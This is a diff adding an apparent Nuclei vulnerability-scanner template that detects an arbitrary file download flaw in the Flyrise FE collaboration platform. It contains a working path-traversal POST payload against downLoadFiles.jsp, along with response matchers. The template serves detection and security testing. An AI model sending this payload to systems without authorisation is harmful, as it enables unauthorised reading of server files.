@@ -1,0 +1,31 @@
+id: flyrise-enterprise-downloadfiles-jsp-anyfile-download
+info:
+  name: Flyrise FE Business Collaboration Platform Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /system/mediafile/downLoadFiles.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=..%2F..%2Fjboss%2Fweb%2Ffe.war%2Fsystem/mediafile/downLoadFiles.jsp&msVal=2222222222%2C
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "downLoadFiles.jspPK"
+        part: body
+      - type: word
+        words:
+          - "attachment;filename="
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
